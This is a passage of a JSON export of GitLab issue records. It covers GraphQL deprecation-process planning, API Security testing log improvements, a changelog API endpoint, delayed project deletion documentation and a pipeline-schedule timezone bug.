https://gitlab.com/groups/gitlab-org/-/epics/7155:\n\n- Ecosystem should create an Epic to track upcoming GraphQL deprecation removals for the next major milestone, repeating for each major milestone, this could be automated https://gitlab.com/gitlab-org/gitlab/-/issues/334278#note_735575125 or just a reminder could be added to our milestone planning issue https://gitlab.com/gitlab-org/gitlab/-/issues/334278#note_735104142.\n- 2 milestones before the upcoming major release, check that all deprecated schema has been correctly announced https://gitlab.com/gitlab-org/gitlab/-/issues/345972, and ping people if not.\n- On major releases ensure that all removals [are announced](https://about.gitlab.com/handbook/marketing/blog/release-posts/#removals).\n\n### Proposal\n\nThe proposal is to make this process self-serve as much as possible https://gitlab.com/gitlab-org/gitlab/-/issues/345974#note_849203497.","state":"closed","created_at":"2021-11-18T03:26:06.491Z","updated_at":"2022-11-22T19:11:45.229Z","closed_at":"2022-08-17T00:17:30.789Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["GraphQL","WorkingGroup::API","devops::manage","group::integrations","meta","missed:14.10","missed:14.9","missed:15.1","missed:15.2","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345974","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345974","notes":"https://gitlab.com/api/v4/projects/278964/issues/345974/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345974/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345974","relative":"#345974","full":"gitlab-org/gitlab#345974"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7155,"epic":{"id":389022,"iid":7155,"title":"Improve GraphQL API deprecation process","url":"/groups/gitlab-org/-/epics/7155","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97520393,"iid":345972,"project_id":278964,"title":"Update developer-facing GraphQL docs with new GraphQL deprecation process","description":"This issue is part of the Epic https://gitlab.com/groups/gitlab-org/-/epics/7155. Please see that Epic for more context.\n\n### About\n\nWe should update our [engineer-facing GraphQL developer docs](https://docs.gitlab.com/ee/development/api_graphql_styleguide.html) to add these steps in order to deprecate GraphQL schema:\n\n1. Add an entry into [`data/deprecations`](https://about.gitlab.com/handbook/marketing/blog/release-posts/#creating-a-deprecation-entry) (this will ensure it gets announced \u003e 2 milestones before removal, because we already state something must be deprecated in GraphQL for at least 6 releases).\n1. Create an issue to remove the deprecated schema to a GraphQL deprecation Epic (note, this doesn't currently exist), assign the issue to someone in their team with the correct milestone and due date.\n\nWe should announce these changes in the Engineering Week in Review and on `#f_graphql`.","state":"closed","created_at":"2021-11-18T03:14:57.989Z","updated_at":"2022-11-22T19:11:46.098Z","closed_at":"2022-06-15T04:51:48.828Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["GraphQL","[deprecated] Accepting merge requests","automation:ml","automation:ml wrong","devops::manage","documentation","group::integrations","missed:14.10","missed:14.9","missed:15.0","section::dev","type::maintenance"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":null,"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345972","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345972","notes":"https://gitlab.com/api/v4/projects/278964/issues/345972/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345972/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345972","relative":"#345972","full":"gitlab-org/gitlab#345972"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7155,"epic":{"id":389022,"iid":7155,"title":"Improve GraphQL API deprecation process","url":"/groups/gitlab-org/-/epics/7155","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97520296,"iid":345970,"project_id":278964,"title":"Update customer-facing GraphQL docs with new GraphQL deprecation process","description":"This issue is part of the Epic https://gitlab.com/groups/gitlab-org/-/epics/7155. Please see that Epic for more context.\n\n### About\n\nWe should update our [customer-facing GraphQL docs](https://docs.gitlab.com/ee/api/graphql/#deprecation-and-removal-process) with the information that breaking changes will only happen on major releases and that deprecations will be announced in a release post at least 2 milestones prior. This brings it into line with https://about.gitlab.com/handbook/product/gitlab-the-product/#process-for-deprecating-and-removing-a-feature. We should also add a link to https://docs.gitlab.com/ee/update/deprecations.","state":"closed","created_at":"2021-11-18T03:08:47.508Z","updated_at":"2022-11-22T19:11:46.939Z","closed_at":"2021-12-05T23:44:32.519Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["GraphQL","automation:ml","devops::manage","documentation","group::integrations","section::dev","workflow::in review"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345970","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345970","notes":"https://gitlab.com/api/v4/projects/278964/issues/345970/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345970/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345970","relative":"#345970","full":"gitlab-org/gitlab#345970"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7155,"epic":{"id":389022,"iid":7155,"title":"Improve GraphQL API deprecation process","url":"/groups/gitlab-org/-/epics/7155","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97515923,"iid":345965,"project_id":278964,"title":"Document how to provide feedback or report issues","description":"Users of API Security that create issues often don't know to apply a label so the issue is seen by the team. Recently a customer reported issue sat without a reply for 4 months.\n\n### Proposal\n\nAdd a section in the trouble shooting guide for DAST API and API Fuzzing with a quick guide on reporting bugs, feedback, and feature requests.\n\n- Set ~\"Category:API Security\" label\n- Bugs\n  - Full job details console output\n  - `.gitlab-ci.yml` job definition\n  - What version of gitlab (if offline)","state":"closed","created_at":"2021-11-17T23:51:09.072Z","updated_at":"2021-12-13T03:22:33.603Z","closed_at":"2021-12-09T17:35:24.573Z","closed_by":{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"},"labels":["Category:API Security","GitLab Ultimate","backend","devops::secure","group::dynamic analysis","section::sec","type::feature","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"}],"author":{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"},"type":"ISSUE","assignee":{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345965","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345965","notes":"https://gitlab.com/api/v4/projects/278964/issues/345965/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345965/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345965","relative":"#345965","full":"gitlab-org/gitlab#345965"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97502301,"iid":345940,"project_id":278964,"title":"Add additional information about each operation to worker entry output","description":"Additional details about each operation being tested is useful for understanding how to optimize an API Security testing job. Current information is limited, and some of it is only available in debug logs, or after an operation has been tested.\n\n### Proposal\n\nFor each operation:\n- Show these when we start testing an operation\n  - Number of parameters broken out by header, querystring, body\n  - Size of body in human readable format (130M, 10K, or 3 bytes)\n- Show these when we finish an operation\n  - Number of requests\n  - Time to test in minutes\n  - Average call time for the operation (calculate in worker-entry)\n\n\n### Example\n\n#### Current output\n```log\n2021-11-24 00:00:00 [INF] API Security: Loaded 1 operations from: /app/example_http_archive.har\n2021-11-24 00:00:00 [INF] API Security: Testing operation: 'DELETE /api/users/2'.\n2021-11-24 00:00:00 [INF] API Security: Finished testing operation 'DELETE /api/users/2' performed 1874 requests.\n2021-11-24 00:00:00 [INF] API Security: Generating security report as '/output/int-report-har.json'.\n```\n### Sample\n```log\n2021-11-24 00:00:00 [INF] API Security: Loaded 1 operations from: /app/example_http_archive.har\n2021-11-24 00:00:00 [INF] API Security: Testing operation: 'DELETE /api/users/2'.\n2021-11-24 00:00:00 [INF] API Security:  - Parameters: (Headers: NN, Query: NN, Body: NN)\n2021-11-24 00:00:00 [INF] API Security:  - Request body size: HH (NN bytes)\n2021-11-24 00:00:00 [INF] API Security: Finished testing operation 'DELETE /api/users/2' performed 1874 requests.\n2021-11-24 00:00:00 [INF] API Security:  - Performed 472 requests\n2021-11-24 00:00:00 [INF] API Security:  - Average response body size: HH (NN bytes)\n2021-11-24 00:00:00 [INF] API Security:  - Average call time: HH (NN seconds)\n2021-11-24 00:00:00 [INF] API Security:  - Time to complete: HH (NN seconds)\n2021-11-24 00:00:00 [INF] API Security: Generating security report as '/output/int-report-har.json'.\n```\n\n### Implementation plan\n1. [x] Use Operation full Name\n\t1. [x] Use `Operation.FullName` instead of `Operation.Name` when reporting status of operation\n\tbefore\n\t```log\n\t2021-11-30 08:14:57 [INF] API Security: Testing operation: 'DELETE /api/users/2'.\n\t2021-11-30 08:16:12 [INF] API Security: Finished testing operation 'DELETE /api/users/2' performed 1716 requests.\n\t```\n\n\tafter\n\t```log\n\t2021-11-30 08:14:57 [INF] API Security: Testing operation: 'DELETE http://192.168.100.12:7777/api/users/2'.\n\t2021-11-30 08:16:12 [INF] API Security: Finished testing operation 'DELETE http://192.168.100.12:7777/api/users/2' performed 1716 requests.\n\t```\n\n\t1. [x] Rename `OperationStatus.Name` to `OperationStatus.FullName`\n1. [ ] Add additional information\n\t1. [x] Collect information in scanner\n\t\t1. [x] Add to `OperationStatus` following properties:\n\t\t\t1. [x] HeaderParamCount\n\t\t\t1. [x] QueryParamCount\n\t\t\t1. [x] BodyParamCount\n\t\t\t1. [x] BodySize\n\t\t\t1. [x] long AverageResponseBody =\u003e TotalRequests / SumResponseBodySizes\n\t\t\t1. [x] long SumResponseBodySizes\n\t\t1. [x] Populate information with using `request` (current request) in `WebRunnerMachine` once new operation is detected.\n\t\t\t1. [x] HeaderParamCount, QueryParamCount, BodyParamCount, BodySize\n\t\t1. [x] Populate SumResponseBodySizes in `WebRunnerMachine`, add a task to execute after the request is done, and send `State` information related to the Operation.\n\t1. [x] Update worker entry to display new format\n\t\t1. [x] Usee FullName instead of Name\n\t\t1. [X] Compute average time by using the difference between OperationStatus.StartTime and OperationStatus.EndTime. \n\t1. [x] Add/Update tests","state":"closed","created_at":"2021-11-17T17:50:11.832Z","updated_at":"2022-02-14T03:21:31.757Z","closed_at":"2022-02-10T20:29:13.800Z","closed_by":{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"},"labels":["Category:API Security","GitLab Ultimate","backend","devops::secure","feature::enhancement","group::dynamic analysis","section::sec","type::feature","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"}],"author":{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"},"type":"ISSUE","assignee":{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345940","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":19,"completed_count":18},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"18 of 19 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345940","notes":"https://gitlab.com/api/v4/projects/278964/issues/345940/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345940/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345940","relative":"#345940","full":"gitlab-org/gitlab#345940"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97498982,"iid":345934,"project_id":278964,"title":"Introduce a new `GET /projects/:id/repository/changelog` API endpoint to get release notes for a given commits range","description":"As suggested in https://gitlab.com/gitlab-org/quality/pipeline-common/-/issues/8#note_736011526, it would be great to introduce a new `GET /projects/:id/repository/changelog` API endpoint that would just return the release notes (instead of adding them to the CHANGELOG file).\n\nThis would work the same as the existing `POST /projects/:id/repository/changelog` API endpoint, except that it would return the release notes in the response body.","state":"closed","created_at":"2021-11-17T16:49:11.518Z","updated_at":"2022-02-02T13:46:59.344Z","closed_at":"2021-11-24T10:57:16.534Z","closed_by":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"labels":["Dogfooding::Being Built","Engineering Productivity","api","feature::addition","type::feature","workflow::staging"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"}],"author":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"type":"ISSUE","assignee":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345934","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345934","notes":"https://gitlab.com/api/v4/projects/278964/issues/345934/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345934/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345934","relative":"#345934","full":"gitlab-org/gitlab#345934"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97497843,"iid":345930,"project_id":278964,"title":"Improve documentation for Delayed Project Deletion","description":"## Problem to solve\n\nCurrently documentation for \"delayed project deletion\" feels incomplete.  This is especially visible right now because of the effort to [mitigate accidental project deletion](https://gitlab.com/groups/gitlab-org/-/epics/6852), which may rely on \"delayed project deletion\".\n\nSpecifically, it feels like there is currently no SSOT for delayed project deletion.  That seems to have led to documentation cross-referencing in ways that feel unexpected/unclear.  Also, we've found some documentation is using deprecated terminology, and some documentation is missing, as a result of multiple engineers contributing to this feature set over time.\n\n## Proposal\n\n- [x] Add a documentation section to serve as the SSOT for the \"delayed project deletion\" feature set. This section should explain the feature, and all the available settings.  https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74721\n- [x] Link to the SSOT in other documentation: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75684\n- [x] Replace \"remove\" with \"delete\" for clarity and consistency: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74640\n- [x] Add missing documentation for admin Deleted Projects page: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74652\n\n## Overview of existing documentation\n\n### Admin level\n\n- [Setting: Default enabled for new groups](https://docs.gitlab.com/ee/user/admin_area/settings/visibility_and_access_controls.html#default-delayed-project-deletion)\n- [Setting: Default delay](https://docs.gitlab.com/ee/user/admin_area/settings/visibility_and_access_controls.html#default-deletion-delay)\n\n### Group level\n\n- [Setting: Enable delayed project removal](https://docs.gitlab.com/ee/user/group/#enable-delayed-project-removal)\n\n### Project level\n\nNONE\n\n### User\n\nNone\n\n### GitLab.com\n\n- [Setting: Delay enabled by default](https://docs.gitlab.com/ee/user/gitlab_com/#delayed-project-deletion) (due to group-level default?)","state":"closed","created_at":"2021-11-17T16:27:09.212Z","updated_at":"2022-05-23T13:52:44.890Z","closed_at":"2021-12-02T17:44:24.474Z","closed_by":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"labels":["devops::manage","documentation","group::compliance","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"}],"author":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"type":"ISSUE","assignee":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345930","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":4},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345930","notes":"https://gitlab.com/api/v4/projects/278964/issues/345930/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345930/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345930","relative":"#345930","full":"gitlab-org/gitlab#345930"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97496128,"iid":345925,"project_id":278964,"title":"Pipeline schedules timezone reset to UTC when editing","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nCustomer reported in [zd-250600(internal)](https://gitlab.zendesk.com/agent/tickets/250600) reported a bug when the a pipeline schedule is going to be edit the previous selected timezone resets to UTC. \n\nThis has been confirmed in gitlab.com, the behavior seem to be every other time the pipeline gets edited.\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n- Create a pipeline Schedule.\n- Select a different timezone from UTC.\n- Add variables to the schedule\n- Save.\n- Go edit the schedule pipeline.\n- Time zone changed back to UTC.\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n[Example Project](https://gitlab.com/gitlab-silver/ggutierrez/250600-17nov21/-/pipeline_schedules/184571/edit)\n\n![Timezone_change](/uploads/b503814882bb006b2c5a9d96adb719a1/Timezone_change.mov)\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\nSelected timezone reset to UTC\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\nSelected timezone should be persisted on pipeline schedule.\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n This bug happens on GitLab.com \n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2021-11-17T16:04:05.516Z","updated_at":"2022-01-11T16:11:42.040Z","closed_at":"2022-01-11T16:11:42.020Z","closed_by":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"labels":["Category:Pipeline Authoring","UX","candidate::14.7","customer","devops::verify","frontend","group::pipeline authoring","pipeline","priority::2","regression","regression:14.5","section::ops","severity::2","type::bug","workflow::ready for development"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":2410096,"username":"JonstonChan","name":"Jonston Chan","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6dbe2781758eec51d1e476e10487e5f6?s=80\u0026d=identicon","web_url":"https://gitlab.com/JonstonChan"},{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"}],"author":{"id":7922794,"username":"gerardo","name":"Gerardo Gutierrez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/107f2254e95c85808cd44699e6f97616?s=80\u0026d=identicon","web_url":"https://gitlab.com/gerardo"},"type":"ISSUE","assignee":{"id":2410096,"username":"JonstonChan","name":"Jonston 